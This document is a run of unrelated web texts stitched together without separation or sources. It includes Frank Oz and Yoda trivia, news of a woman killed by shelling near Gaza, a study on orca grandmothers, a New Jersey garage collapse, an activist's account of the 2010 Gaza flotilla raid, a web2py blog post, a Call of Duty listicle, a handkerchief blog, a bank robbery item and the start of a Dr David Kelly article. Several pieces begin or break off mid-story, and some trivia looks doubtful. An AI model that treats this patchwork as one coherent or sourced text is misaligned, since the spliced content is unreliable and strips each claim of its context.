Today I found out the person who did the voice and puppeteer work for Jedi Master Yoda also did the same for Miss Piggy and the Cookie Monster .
The man was Frank Oz and not only did he do the voice of Yoda and most of the puppetry work , he is also responsible for quite a bit of Yoda ’s character as well , including the distinct “ Yodic ” style of speech ( Object , Subject , Verb ) .
Besides Yoda , Miss Piggy , and the Cookie Monster , Oz did the characters Fozzie Bear , Animal , Grover , Sam the Eagle , and Bert ( from Bert and Ernie ) .
Oz also famously directed The Muppets Take Manhattan ; The Little Shop of Horrors ; What About Bob ? ;
The Indian in the Cupboard ; The Score ; and The Stepford Wives , among others .

Bonus Facts :
Oz reprised his role as Yoda in The Phantom Menace and was used as the voice of Yoda in Attack of the Clones , and Revenge of the Sith , at which point Yoda was completely computer generated ; a move that was praised by Oz for the versatility it added to what Yoda could do in the film , but condemned by many critics and fans .
Yoda ’s original name before being shortened to just “ Yoda ” was “ Minch Yoda ” .
Lucas eventually decided to leave the first name out along with not giving away many details about Yoda ’s past .
In “ The Phantom Menace ” , in scenes where Yoda was walking around , Warwick Davis played Yoda , obviously in a Yoda suit .
Warwick Davis got his first movie role at the age of 11 playing Wicket the Ewok .
Davis was originally cast as an Ewok extra , but the actor who originally was going to play Wicket , Kenny Baker , got sick and Warwick was selected to take over .
Ron Howard and George Lucas wrote Willow with Warwick Davis in mind to play the staring role , even though he was just 17 when he was offered the role and 18 when the movie was filmed .
This was Davis ’ first role where his face was visible .
Davis is more recently known for his role has Filius Flitwick in the Harry Potter series .
He will also play the Goblin Bank Teller in Harry Potter : The Deathly Hallows , replacing dwarf actor Verne Troyer who played the role in the previous Harry Potters .
The Ewoks were named after the Native American tribe Miwok .
The Miwok ’s lived in the Redwood forest that is the setting for the Endor scenes on Return of the Jedi .
“ Adventures of Luke Starkiller , As Taken From the Journal of the Whills , Saga 1 : The Star Wars ” was the original title of “ Star Wars : A New Hope ”
R2 - D2 ’s name came from the movie - maker lingo “ reel 2 , dialog 2 ” .
George Lucas was so enamored with
Oz ’s performance of Yoda on Empire Strikes Back that he tried to get Oz an Oscar nomination for “ Best Supporting Actor ” .
The voice of Yoda on the radio dramatizations of the Empire Strikes Back and Return of the Jedi was done by John Lithgow .
Miss Piggy ’s full name is “ Pigathia Lee ” , as revealed on episode 106 and 116 of The Muppet Show .
“ Pigathia ” is derived from ” Piganthius ” , which is Greek for “ river of passion ” .
Frank
Oz officially retired as Miss Piggy in 2002 , being replaced by Eric Jacobson .
Famed Puppeteer Jim Henson aided makeup artist Stuart Freeborn in creating the Yoda puppet used in the films .
It was Henson who suggested to Lucas that he use Frank Oz for Yoda ’s voice and as the puppeteer .
Jim Henson got his first taste of puppetry in an applied arts course in college where he studied Home Economics .
In his early career , he primarily made commercials , including over 300 coffee advertisements using his Muppets .
Jim Henson ’s work on Sesame Street has been called the “ spark that ignited ” the Public Broadcasting Network .
Henson and Oz helped produce a series of sketches on the first season of Saturday Night Live using their puppets as the staring characters .
Henson is one of only two people who appear on the Hollywood Walk of Fame twice .
He appears as Kermit the Frog and himself .
The Mel Blanc is the other person who appears on the Walk of Fame twice .
He appears as Bugs Bunny and himself .

A MOTHER of five was killed by Israeli artillery fire when she went to fetch her two - year - old son from outside her village home close to the “ buffer zone ” created by Israel along its border with Gaza .
Three of her relatives were wounded in the shelling earlier this week , but Red Crescent ambulances were not permitted to reach the family for several hours .
According to the woman ’s husband , Nasser Abu Said ( 37 ) the attack began without warning at about 8.30 pm on Tuesday with two shells being fired as the family of 17 sat outside their house in the village of Johar a - Deek .
Apart from Nasser and his 65 - year - old father , the entire group was women and children .
“ It was completely quiet , there were no rockets being fired or we would n’t have been sitting outside , ” he said , referring to Qassam missiles launched by militants into Israel .
His sister and his brother ’s wife were injured by shrapnel .
The family moved indoors and called an ambulance .
“ About 10 minutes later the ambulance called back to say the Israelis had refused them permission to come to the house , ” said Nasser .
His wife Ne’ema ( 33 ) soon realised their youngest son , Jaber , was not among the children she was attempting to calm down , and was probably asleep on a mattress outside .
As she went to fetch the toddler , another shell landed .
“ I called to my wife three times , ” said Nasser , who realised his father had also been badly injured in his leg and stomach .
“ I could hear small noises coming from her .
I knew she was dying . ”
Through Palestinian co-ordinators , the Israeli Defence Force ( IDF ) told the family that anyone going outside the house would be shot dead .
Nasser began to tend to his injured father , knowing he could not reach his dying wife .
After two hours , an ambulance was allowed to reach the family .
The Palestinian Centre for Human Rights ( PCHR ) , which investigated the incident , said Ne’ema and her wounded relatives were taken to al - Aqsa Martyrs hospital in Deir al - Balah , where it was confirmed she had died from shrapnel wounds .
The IDF said it had identified a number of suspects close to the border .
“ An IDF force fired at the suspects and identified hitting them , ” it said .
The incident was being investigated , it added , but declined to say why ambulances had not been allowed to reach the family .
Since the three - week war in Gaza that began in December 2008 , the IDF has continued to fire on Palestinians it suspects of launching rockets at Israeli civilians or attempting to attack Israeli forces .
It created a 300 m - wide buffer zone on Palestinian farmland adjacent to the border with Israel and warned it would shoot anyone seen within the forbidden area .
The Abu Saids say their land is not used by militants to fire rockets as it is open ground in full view of an Israeli watchtower .
In the first five months of this year , 22 Palestinians were killed by Israeli forces in the buffer zone , according to the PCHR .
The IDF says one soldier and a Thai farmworker were killed and two soldiers wounded in militant attacks in the first half of this year .
Palestinians have been unable to harvest their crops in the zone , which has swallowed about 30 per cent of Gaza ’s arable farmland .
The Abu Said family have lived in the area for 40 years , but have had to abandon the part of their land inside the zone .
The PCHR condemned the shelling which , it said , “ constitutes the highest degree of disregard for Palestinian civilians ’ lives ” .

Image caption Orca grandmothers develop close ties to infants in their pods
Scientists have discovered an evolutionary reason why humans and whales both have grandmothers .
As post - menopausal females age , the researchers say , they become increasingly interested and helpful in rearing their " grandchildren " .
This could help explain why female great apes and toothed whales ( cetaceans ) have lifespans that extend long beyond their reproductive years .
They report the findings in the Royal Society journal Proceedings B .
It is specifically among great apes and toothed whales that menopause and post - reproductive helping have evolved Rufus Johnstone and Michael Cant , Evolutionary biologists
The " grandmother hypothesis " was first proposed in the 1950s .
It stated that menopause , which stops a female 's fertility well before the end of her lifespan , may have evolved to benefit a social group , because grandmothers went on to play such an important a role in caring for offspring that were already born .
Dr Michael Cant , from the University of Exeter in the UK , was one of the authors of this paper .
He explained that he and his colleague , Rufus Johnstone , looked at how humans and whales balanced " the costs and benefits of breeding with the costs and benefits of switching off breeding " .
Dr Johnstone , who is an evolutionary biologist based at the University of Cambridge , told BBC News : " It 's easy to forget about the cetaceans , but since they 're the only other mammal apart from us [ where females ] have a comparable post - reproductive lifespan , it 's important to study them in this context . "
Previous studies have suggested that female chimpanzees and gorillas also go through menopause , but the conclusions are controversial .
The two scientists developed a mathematical model to study " kinship dynamics " in killer whales ( orcas ) , short - finned pilot whales and humans .
This revealed that , as post - menopausal females aged , they developed closer ties to infants .
This showed , the scientists said , an " underlying similarity " between whales and great apes that might otherwise have been masked by the big differences in their social structures .
" Our analysis can help explain why , of all long - lived social mammals , it is specifically among great apes and toothed whales that menopause and post - reproductive helping have evolved , " the researchers wrote in the paper .
Eric Ward , a scientist from the US National Oceanic and Atmospheric Administration in Washington , has carried out research into how post - reproductive females influence whale populations .
He told BBC News : " The model the authors propose is certainly interesting , and may explain the evolution of menopause in orcas . "
( CNN ) -- A " major tragedy was averted " Saturday as officials announced no one had died in a New Jersey parking garage collapse .
Rescuers had scrambled all night long to find people they suspected were trapped in cars crushed in the rubble of the three - story structure that came crashing down almost a day earlier in Hackensack .
The fears were unfounded , said Hackensack Fire Department Lt. Stephen Lindner .
He said at a morning news conference that " a major tragedy was averted by no one getting crushed under tons of concrete and debris . "
Officials said one reason why no one died is because the garage fell after the morning rush hour and because many people were possibly on summer holiday .
The reason for the collapse has not yet been determined , said Joseph Mellone , a Hackensack construction official .
An investigation will be conducted .
Lindner said search operations were still ongoing but rescue teams were probing in a much safer way as to not cause a further collapse of the garage .
The garage collapsed shortly before 11 a.m. Friday .
Lindner said three stories of the underground parking structure " pancaked , " one on top of the next .
State , county , and city workers were working cautiously to avoid secondary collapses .
They are digging by hand , at times allowing heavy equipment to remove larger pieces of debris .
Engineers were assessing the structural integrity of the apartments attached to the parking structure .
Those living in the apartment building adjacent to the garage were not allowed to stay there Friday night , Lindner said .
Chris Baldo , who lives on the first floor of the building , said the collapse felt like an earthquake .
He said he could see the entire collapse from his balcony , adding that his first - floor apartment " looked like it was the fourth floor " by the time the dust settled .

Kevin Ovenden is an organizer of the Viva Palestina solidarity group and veteran of two convoys to Gaza .
He spoke to Lee Sustar about the murderous Israeli assault on the peace flotilla -- and he makes the case that the Palestinian solidarity movement must seize the moment to build wider support for ending the siege .
Outraged protests have spread around the world following the Israeli commando raid on a flotilla carrying desperately needed humanitarian aid to Gaza .
At least nine people were killed , and many more injured when Israeli forces attacked the unarmed peace activists in the middle of the night on May 31 .
But the Israeli government of Prime Minister Benjamin Netanyahu continues to spin lies about the assault , with the connivance of the Israeli and American media .
WHEN DID it become clear that the flotilla faced violence at the hands of Israeli military forces ?
I BECAME increasingly convinced that the Netanyahu government would stop at nothing to stop the flotilla , and the reason for my thinking was that it became clear that allowing the flotilla in -- given the level of international support that was developing on Thursday and Friday of the previous week -- would have signaled the end of the embargo on Gaza .
In fact , what 's happened has also signaled the end of the siege .
It 's changed the situation utterly .
At the time , I believed that Israel 's calculation was based on two things -- one , that the force used would be brutal , but would not lead to such a large number of casualties -- though it would lead to casualties .
And second , that they would get away without any backlash in world opinion because , quite frankly , they 've gotten away with far bigger crimes .
They got away with , at least in the immediate term , the murder of over 1,400 Palestinians in Gaza with the assault in December 2008 and January 2009 .
Israeli soldiers fire on solidarity activists after landing on the deck of the lead ship in the Gaza Freedom Flotilla
By Saturday , May 29 , and certainly by Sunday , I became convinced that this was the calculation that had been made .
Ninety miles away from Israeli territory -- which is well within international waters -- we made the first contact with Israeli forces when we were parallel with the north of Israel , just coming south of Lebanon .
When that happened , I sent out a very short but ominous e-mail alert to friends to circulate , anticipating that there would be a violent attack on the flotilla .
THE ISRAELI government and the right - wing media claim that Israel made an attempt at a nonviolent seizure of the ships , and their soldiers only fired back when they were attacked by the residents with pipes and other weapons .
What really happened ?
I WAS on the lead ship out of six -- the Mavi Marmara .
The initial contact was made at 11 p.m. on Sunday night , and people came to the top of the ship -- there was obviously a lot of commotion .
We had satellite broadcasting on board , and we got our message out around the world .
Featured at Socialism Hear Kevin Ovenden at Socialism 2010 in Chicago , speaking on a panel discussion on " Breaking the Siege of Gaza , " along with Tariq Ali , Gilbert Achcar and Ahmed Shawki .
Check out the Socialism 2010 Web site for more details .
See you at Socialism !
But for two or three hours , people were milling around , and lots of people went to get some rest , on the advice of the organizers .
It was pitch black -- the middle of the night .
We were 90 miles away from Israel .
The internationally recognized sovereignty zones extend 22 miles into the sea .
Obviously that does n't apply for Gaza itself , but we were well away from Gaza .
The Israelis have unilaterally extended their sea border to 68 miles .
But we were a further 12 to 22 miles outside of even that unacceptable and unsupportable extension .
So people got some rest .
There were lots of people on the lookout .
I woke up at 4 a .m. along with lots of other people -- it was around the time for the fajr morning prayer for the Muslims on the vessel .
At about 4:25 a.m. , the assault began .
It began with percussion grenades .
They are an explosive , and they can injure people badly when they go off next to them .
They were designed to create panic , which itself is an extremely reckless and violent act when you consider that this was a civilian passenger ship carrying over 500 people from 32 different nationalities .
The youngest participant was not yet one year old .
The oldest was 88 years old .
We were carrying , among others , parliamentarians , including two members of the German Bundestag , and the exiled Eastern Catholic archbishop of Jerusalem , Archbishop Hilarion Capucci , who is 85 years old and has the use of only one leg .
This is an indication of the kinds of people who were aboard the ships .
To fire percussion grenades and generate panic on a boat moving at a speed of about 22 knots in pitch darkness in the open sea in the Eastern Mediterranean at night is itself a violent act .
Israeli attack dinghies , called Zodiacs , moved up very quickly on the side of the boat .
They were carrying fully armed Special Forces - - full commando attack units .
By fully armed , I mean something like five pieces of firepower or knives -- rifles , sidearms , commando knives , balaclava - covered faces , Kevlar helmets and so on .
In other words , something akin to the U.S. Navy Seals people see in the movies in a glamorized way .
A helicopter moved in over the ship , and people began to file down .
There was , of course , massive commotion aboard the ship .
In that commotion , some people responded quite instinctively and with good cause -- and with all legal and moral authority on their side .
They pushed back , fought back with their hands and with whatever was to hand on the top of the ship where the first soldiers landed .
Two soldiers were pushed from the top of the ship onto the next deck down .
They had already opened fire with what I thought to be rubberized bullets .
These are not bullets that are made of rubber .
They have a steel core , but are surrounded by rubber , and can themselves be lethal .
But almost immediately , we heard the different noise of live rounds being fired -- but not indiscriminately or wildly .
Rather , it was carefully targeted from both sides of the ship -- which was surrounded -- from the helicopter , and from those Israeli attack forces who were landing on the ship itself .
I can give you some examples of what happened -- one from another colleague who was also on the Viva Palestina delegation aboard the ship , Nicci Enchmarch .
She was next to one of the very first people to be killed .
He was a Turkish man who was holding a camera -- that 's all he had in his hands .
He was shot directly through the center of the forehead .
The exit wounds through the back of the head took away the back third of the skull .
He fell to the ground and experienced his last few seconds of life .
This is the nature of the attack from the Israelis .
After they commandeered the whole ship and brutally rounded people up , they gathered together whatever they could find on the ship to pile up and show what we had used as weapons .
We could see that they took knives from the kitchen , where of course there were knives .
They were kitchen knives , not commando knives or anything like that -- and they piled those up as if they were used as weapons .
They most certainly were not used as weapons .
The evidence for that is the two Israeli soldiers , who were disarmed for the safety of everybody on the ship .
They were very quickly disarmed and taken down to the area we 'd set up as an improvised emergency room .
They were looked after - - guarded -- so that there would be no reprisals from anybody who was feeling outraged .
The injuries that they sustained were injuries from being manhandled , perhaps hit with sticks .
They were walking wounded .
They were given back to their units as soon as possible , after the murderous attacks stopped .
This is why the Israeli lie machine is stumbling to a halt on this question .
Whatever they claim , whatever selective footage they try to put forward , the brutal fact is that nine people -- at least -- were murdered , with gunshot wounds , and some Israeli soldiers ended up getting roughed up .
That 's the balance of the use of force -- on the one hand , the use of force by some people to defend themselves ; on the other , a truly murderous attack , a massacre .
CAN YOU help answer the question about the confusion , about the numbers dead ?
YES .
PEOPLE were killed in various parts of the outside of the ship , on the decks .
The attack lasted for about 28 minutes .
The captain was then able to broadcast by loudspeaker that the ship had been taken .
He told everybody who had been on the outside of the ship to desist from demonstrating against the Israelis .
Many of us , simply by our physical presence , were hoping to delay the attack and protect the lives of other people .
No one knew , when the live firing started , what would happen if the Israelis got inside the ship , and perhaps started firing wildly where there were even more people .
So we then went inside to the large sleeping areas , and the Israelis poured onto the walkways and onto the very top of the ship - - into the bridge and the engine room and so on .
Then , for more than an hour and a half , we appealed via the loudspeaker system , and via an Israeli Knesset [ parliament ] member , an Arab who speaks fluent Hebrew .
She went forward to the windows with a sign explaining who she was , and that we had many , many injured .
We had managed to get as many as we could to the makeshift emergency room -- some of which became a makeshift mortuary .
But many of the people who were killed or seriously injured were still on the roof and the top decks of the boat .
It was chaos -- we did n't know how many there were .
She was told to go back or she'd be shot , as would anybody who attempted to make contact with the Israelis .
For more than an hour and a quarter , we were appealing for help in a situation where quite literally we had people who were bleeding to death .
According to the medics , at least one of those people who died may well have had their life saved if more sophisticated medical assistance of the kind that 's onboard an Israeli vessel had been to hand .
But we were not allowed to evacuate any wounded over to the Israelis for more than an hour and a quarter , during which time one person died .
So you can imagine the situation .
There are seriously wounded people , and bodies lying in various parts of the ship .
And then we were treated with a mixture of contempt , humiliation and attempts to degrade us throughout the rest of the horrific , horrific ordeal .
There was scant regard for the wounded .
We tried to get out one wounded person at a time to the Israelis .
The Israelis were not at all sensitive in handling them .
We had them on stretchers , but they were rudely bundled up upstairs .
These are people with abdominal and serious leg wounds .
We sent experienced medics , one with each of the wounded .
The medics were taken , thoroughly body - searched , handcuffed and not allowed to be with the wounded .
We were n't allowed to go upstairs , which was where most of the bodies were .
So it 's taken some time to piece things together .
There are still two critically ill people in Israel , and there are six in the military hospital in Ankara , who are very seriously ill , but appear to be recovering .
So I 'm afraid to say that the figure of nine deaths , which took us 48 hours to establish , could go even higher .
WHAT WAS the treatment you were given when you were finally taken to the Israeli port of Ashdod ?
THEY STOPPED the ship to begin removing bodies -- this was still while we were at sea .
They will , of course , have taken pictures .
People have to ask themselves why , if the Israelis are so keen to explain what 's taken place , have they have not been prepared to release those pictures to the world ?
We know why .
I found out from Turkish officials that one of the people killed was shot at close range through the back of the head -- which is an execution .
As the ship was stopped , and after the seriously wounded had been evacuated , we were led out onto the deck one by one , thoroughly searched , with all our belongings and everything taken .
Some people had their passports taken at that stage .
We were cable - tied with those plastic cuffs -- and most of the men with their hands tightly behind their backs .
Most of the women were in front .
Some people -- journalists and members of parliament -- were not cable - tied .
But we were placed on the decks of the boats , with many people in stress positions , on their knees , heads down , arms cable - tied behind their backs .
We were n't allowed to talk .
People who asked questions were pushed down .
Anybody who tried to stand up was pushed down , so that they fell down , with guns pointed in their face .
It was all the tactics that people may have seen meted out against the Palestinians and meted out by occupation forces in Iraq , Afghanistan and elsewhere in the world -- paramilitary terrorizing tactics .
I saw one British citizen on his knees , arms cable - tied behind his back , slapped three times across the face .
Three people who I took to be Palestinian were also blindfolded and then kicked to the ground , arms tied behind their backs .
Sheikh Raed Salahm - - a leader of the Islamic Movement in Israel who was with us who is from Jerusalem - - was taken off and severely intimidated , although he maintained his composure throughout .
There was a menacing atmosphere , one in which you could legitimately fear that someone could be shot even though they were handcuffed .
When we got to Ashdod , people were taken off one by one .
As we were processed , Israeli intelligence and all manner of different state agencies were there .
There were attempts to bully , humiliate , belittle and frighten people .
We were told as we got there not to worry -- that we were simply going to be deported , and that we would be reunited with our belongings after we had been processed .
After we were processed , we were put into prison vans , which are cells on wheels , and nobody was taken immediately to the airport as had been promised .
That was all a mind game .
Everybody was taken to a new prison facility in the Negev Desert .
I arrived on the night of Monday the 31st and was eventually released on the morning of Wednesday the 2nd .
WHY DID you end up in Turkey ?
WE IN the Viva Palestina delegation -- and , I think , many others -- had already decided that in this event , we would ask to go to Istanbul , because this is the area where most of the convoy had headed off from , and where we could rendezvous with friends from around the world .
In fact , all the Arabs were sent to Jordan , I think by land , and everybody else to Turkey .
The Turkish civil organizations -- and by that stage , the Turkish government -- moved with incredible speed and determination to get absolutely everybody out and to safety .
The Turkish airline sent three planes ; the Turkish Red Crescent , or civil organization , sent two ambulance planes ; and the Turkish military sent a third ambulance plane to Tel Aviv to get people out .
We now know that the Turkish prime minister said to the Israelis that if they were not going to release all of the prisoners , then Turkey was prepared for an escalating military confrontation .
WHEN DID you begin to perceive what a political storm the assault had caused ?
I DIDN'T fully know that until Wednesday the 2nd .
We were held incommunicado , of course , but I did have a visit from a man from the British consulate .
I should say that the treatment was not acceptable at all .
We had nothing you could really describe as food on the first night , and the first thing we had resembling a meal was on the Tuesday afternoon , when consulate officials were visiting -- which , as they said , was hardly a coincidence .
The consulate officials were treated contemptuously .
I 'll give you one example : the British consulate official from Jerusalem tried to have a private conversation through a prison cell door -- we were n't allowed to meet face to face -- with two British citizens .
The junior prison guard refused to move .
When he was asked to move , he brought two other prison guards .
When the diplomat explained that under all international treaties , protocol and the law , he 's entitled to speak to his nationals privately , the junior guard said , " Go to your international tribunals , go to your law , we do n't care . "
Of course , in a sense , the prison guard was right -- he was simply reflecting the experience of all Israeli officials over the course of many , many decades , which is that whatever words are uttered at the international level , there 's nothing to make those words reality .
But I heard from the British consulate official something of the scale of what had taken place .
Even the new British foreign secretary -- who at that point had not yet made a speech in the House of Commons - - was condemning the attack and calling for an inquiry .
We 'd managed to piece together among ourselves that there were , we thought , upwards of four dead .
We knew that this would be a major story .
As we were leaving the prison , with no real further information and being taken to the airport in coaches and prison vans , we could see Israeli police , military and civilians through the windows .
I could see the looks on their faces .
I had prepared myself for a journey where we would be jeered at and laughed at from beginning to end , from Be'er Shiva to Ben-Gurion Airport .
In fact , there were looks of hatred and aggressive gestures .
It struck me very quickly that the only explanation for this was that in the international arena -- although Israel had killed many people -- it had wounded itself enormously in its standing and its strategic goals .
One thing 's for sure .
This was an attempt to instill fear -- to use terror to achieve a political objective .
This is the dictionary definition of terrorism .
Real terrorism -- state terrorism , by Israel .
WHAT'S NEXT for the movement to break the siege of Gaza ?
THESE DISCUSSIONS are taking place right now among the leading components of the movement , so I do n't want to say anything that preempts that .
But I think that the following is common ground for everybody .
Firstly , there has never been such an event in the history of the solidarity movement with Palestine .
This is the Sharpeville and the Soweto of the Palestine solidarity movement .
Not of course , the Sharpeville and the Soweto for Palestinians themselves .
They 've experienced many such massacres -- from Deir Yassin in 1948 all the way through to the attacks on Gaza in December - January of 2008 and 2009 .
But for the Palestinian solidarity movement , this is the Sharpeville and Soweto , and it must be turned into such .
Both of those events marked international turning points in the struggle against apartheid and the isolation of the apartheid regime in South Africa , and this strategically is what we need to work toward now .
The momentum , which has come at an incredible , almost unbearable cost , is nevertheless against the Israelis .
It 's with the Palestinians and with all those who stand with them .
This development has several strands .
First , various international bodies and governments have taken strong -- and in some cases , unprecedentedly strong -- positions , not just over the massacre and the call for an independent , international tribunal , but also saying clearly that the siege on Gaza has to come to an end .
This has absolutely been the position of the British government - - a right - wing government has come out with a position that is stronger than the position of the Labour government 18 months ago during the time of the Gaza atrocities .
That 's not a product of government thinking -- it 's a product of the groundswell in Britain , and many , many other countries .
Former British MP George Galloway , my close friend and colleague , was on a speaking tour in the U.S. designed to maximize support for the flotilla and for Palestine .
He spoke in one city on Monday night as news was beginning to break in Houston , and there were 300 or 400 people there .
By Tuesday night , he spoke in Dallas , and there were 1,200 people there .
He describes it as the most electrifying meeting he'd ever been at , and this is someone who 's been at many meetings and many momentous events , particularly around this question .
So the tide is definitely turning .
First , we have to turn all our energies into pushing every government and international body to come out with the strongest possible position , which has to include ending the siege on Gaza as an immediate step toward a wider advance for the Palestinian position .
Second , we have to appeal to the core of people who have already been active on one level or another around the Palestinian question , or those who are already convinced , to re-galvanize the movement , and go out and convince yet wider layers of people .
We must argue the Palestinian case , and also push the case more generally to very wide layers of people .
In Britain , we 're saying : How great is the price to be for blanket support for Israel , and for whatever its governments choose to do ?
The price has now become a murderous attack on nationals from 32 different countries , the murder of nine people , attacks and humiliation and mistreatment of British citizens in the Eastern Mediterranean in an act of piracy on the high seas -- an attack on a Turkish ship with Turkish crew .
People talk of alliances , and Turkey is a NATO ally .
Is this the price they have to pay -- that people who are supposed to be allies are to be murdered so that Israel is supported in anything it does ?
That 's a price which people in Britain are not prepared to pay .
Through this argument , we can move people progressively to a deeper understanding of what 's taking place .
I genuinely believe that this is a major turning point -- not just over the siege of Gaza , but over Palestine and the wider politics of the region .
Everything we do needs to be carefully calibrated and strategically thought out to drive that home in the coming months .

Thank you web2py
After tearing my hair out last night trying to install TurboGears or Zope I had to give up .
The reason ?
They both use egg based distribution systems and I could not , for the life of me , get setuptools to install properly root or no root , zypper or source install ( on openSuSE ) .
I had decided to give up on looking into Python web frameworks , when I stumbled upon a mention of web2 py .
It had a link to a comparison document – hmmm , that looks interesting , I ’ll download that .
Oh , I see , hmmmm … .
It also had a list of example apps to have a look through and actually see working .
By example 31 I was sold .
It was n’t the normal obtuse surely - you - already - know - what - this - application - does partial information – which is a particular failing of open source projects in general I find .
The icing on the cake was that it really , truly , can be downloaded , installed and with a test instance up and running in under 5 minutes ( probably under 3 , I did n’t actually time it ) .
I am so grateful that they have made it so easy for me to get up and running .
Thanks web2py .

Information gleaned from phone taps and local informants suggested the men's lives were at imminent risk .
As a result , the interior ministry put most of the town 's 45 BAC officers on leave or had them relocated .
They were replaced by police from Lyons and Marseilles , along with a contingent of elite officers .
Call of Duty Black
Ops is around the bend and pretty soon most of us will shun the outside world in favor of getting just one more level or achievement .
Or just spend time killing endless waves of Nazi Zombies because they HAVE TO DIE !
Call of duty has become the biggest player on the Firs Person Shooter landscape with each new release garnering tons of news and excitement .
However Activision has not seemed content to simply enjoy the fruits of such a successful franchise and has repeatedly stated how they are going to screw around with a proven formula .
So here are my Top 5 Things that could Ruin Call of Duty .
5 ) Bobby Kotick
I understand that he feels he could find better ways to capitalize on his product , and since he is head of giant soul crushing publisher Activision he has every ( legal ) right to mess with Call of Duty any way he sees fit .
However he tends to run his mouth off every time there is a person with ears around about how he would change almost everything about one of gaming ’s most successful and beloved franchises .
Bobby Kotick is the antonym of fan service .
Nearly every time someone is riled up it is because of something he has said .
Ca n’t he be seen and not heard , like most CEO’s .
4 ) Too many development teams
Call of Duty has had two development teams for a while now and each team has its own strengths and weaknesses .
It is a precarious balance that has managed to work out pretty well so far .
Unfortunately to development teams can not hope to keep up with the schedule that Activision wants to pump out games at .
This leads to other development teams being brought in to put their own spin on what is becoming a “ Call of Duty ” universe .
This can lead to things getting far away from what we would expect from the Call of Duty name .
The snowball effect of this could be terrible .
3 ) The Infinity Ward team is not Infinity Ward anymore
Infinity Wardraised the bar for online multi player for this generation when they released Call of Duty Modern Warfare .
In doing so they gained millions and millions of loyal fans .
Earlier in the year the team exploded as the two heads of the company left Infinity Ward and took dozens of employees with them .
When every employee that left has a title that look like “ senior important advisor of awesome ” things are not looking to great .
Think of it this way ; If the Celtics got rid of their starting five you would n’t expect them to make the NBA finals right ?
Do n’t expect the next Infinity Ward title to carry the same weight .
2 ) Making it Subscription Based
This is an idea that keeps getting mentioned by analyst and ole number 5 on my list .
This idea would absolutely ruin Call of Duty .
It is something that people are used to paying a very certain price for and they are going to be very upset if it is changed .
It is the same problem with Hulu trying to get you to pay for extra features .
If we are used to getting features for free , why would we start paying for it ?
1 ) Giving it the Guitar Hero Treatment
Do you remember when Guitar Hero burst on the scene ?
Fresh and exciting it ushered in a new age of gaming that brought millions of casual gamers into the gaming world .
Each release built on the last for and had a significant amount of buzz surrounding it .
Now Activision pushes out a new Guitar Hero almost every couple of months and no one seems to care anymore .
The over saturation has ruined what was once a great franchise .
So please Activision , lay off the Call of Duty .
Remember your mistakes with Guitar Hero .

Since joining the Riot4austerity last July , I decided to make a switch to hankies .
For some reason I had quite a few already that I was n’t using , and I purchased a few more at thrift stores .
I have been very happy with my decision .
Until Saturday , when I got sick .
The kind of sick where you are sneezing and your nose runs like a faucet .
Well , after a couple hankies were soaked , I decided maybe illness is one of those times when you * should * use Kleenexes .
So I decided to do a little research and came to the conclusion that I personally will never purchase another Kleenex product again .
The following is from the Kleercut site .
Kimberly - Clark Fails Environment in 100 Top Corporate Citizens Ranking Kleenex manufacturer destroys Canada�s Boreal ForestVancouver February 15 , 2007 Paper giant Kimberly - Clark received low marks on the environmental protection in a recent ranking of the top 100 corporate citizens by Corporate Responsibility Officer Magazine on the issue of environmental protection .
The world�s largest manufacturer of tissue products including Kleenex uses large amounts of pulp from destructive logging operations in Canada�s Boreal Forest .
The company has been under the spotlight recently for circulating misleading information about the company�s environmental impacts to its shareholders , customers and the US Securities Exchange Commission .
I pretty much had stopped buying the fancy tissues a long time ago and had switched to the house brand of our local grocery store that carries a line of recycled content paper products .
Here is what they have to say about their facial tissues :
These soft and strong tissues are economical for you and made from 100 % recycled material with at least 10 % of the paper from post - consumer sources , which means it ’s environmentally friendly , too .
Plus , during the manufacturing process , a chlorine - free whitening process is used without inks , dyes or fragrances .
This process is safer for both your family and the earth .
Even during cold season , you can toss away the guilt when using Publix GreenWise Market Facial Tissues , knowing they ’re nose - friendly , as well as earth - friendly .
Well I am not convinced you can ever toss away the guilt , but I agree that you can feel less guilty .
And considering how many tissues I have gone through in these past three days , there is no way I could even have enough hankies to do the job .
Well that is n’t really true .
If I had 100 or maybe 200 hankies I could get through this cold , but lets face it most people do n’t have that many on hand .
So what would I do differently next cold ?
Well I may stock up on more hankies and I may even make some of my own out of men ’s shirts I find in the dumpster .
I could even make some really pretty ones using women ’s blouses .
For anyone out there that is appalled at the idea of using hankies , just remember there are proper ways of using them .
If you take one with you everywhere you go , then when you have an occasional sneeze or crusted feeling nose you can take action .
Most nose blows are not germ filled as in the cold or flu virus .
I hate to tell you this but germs are everywhere and some of them are actually good for us .
I think a lot of people do n’t know that .
Actually , according to this Wikipedia site , germs are bacteria and viruses are not germs .
Wow , I did not even know that .
It also says that most people consider viruses to be germs .
So there you go .
If you do have a cold , something that is contagious , the best thing to do is only use your hanky once , washing your hands immediately .
If you are unable to throw your hanky in the laundry right away or if you have to touch it again for any reason you should wash your hands .
This is a reliable method for not transmitting disease .
If you put a used hanky in your pocket with cold germs on it , just think petri dish .

Something to think about …
If every household in the United States replaced just one box of virgin fiber facial tissues ( 175 sheets ) with 100 % recycled ones ,
we could save 163,000 trees .
If every household in the United States replaced just one roll of virgin fiber toilet paper ( 500 sheets ) with 100 % recycled ones , we could save 423,900 trees .
If every household in the United States replaced just one roll of virgin fiber paper towels ( 70 sheets ) with 100 % recycled ones , we could save 544,000 trees .
If every household in the United States replaced just one package of virgin fiber napkins ( 250 count ) with 100 % recycled ones , we could save 1 million trees .
Hamilton bank staff were left laughing after a bare - chested man demanded 50 cents from them , before crouching down then running away yesterday .
TSB manager Sandra Makein told the Waikato Times it was definitely one of the more unusual attempted robberies she had heard of .
" If you can call it a robbery , " she said .
Police said the man , in his early 20s , entered the Victoria St bank with a bandana over his lower face and demanded $ 10 .
When the teller said she did n't have any money he asked for 50 c before crouching into the starting race position and running out of the bank .
A passing policeman gave chase and the man was caught in Ward St .
He was later assessed by medical and mental health staff .

' Why I 'm certain my friend Dr Kelly was murdered '
His friend : Mai Pederson has damming new evidence to suggest Dr David kelly 's death was not a suicide
They used to walk the streets of Baghdad together after dark .
She liked to clear her head after the tensions of the day ; he wanted to compensate for the missed strolls he normally took in the Oxfordshire countryside near his home .
But these nightly outings for David Kelly , the ill - fated weapons expert , and Mai Pederson , his beautiful young U.S. military interpreter , also provided an intriguing insight into how perilous the British scientist 's position had become .
A senior member of a United Nations inspection team in Iraq , Kelly 's mission was to discover whether Saddam Hussein was hiding weapons of mass destruction - and to determine whether America and Britain would go to war .
The stakes could not have been higher .
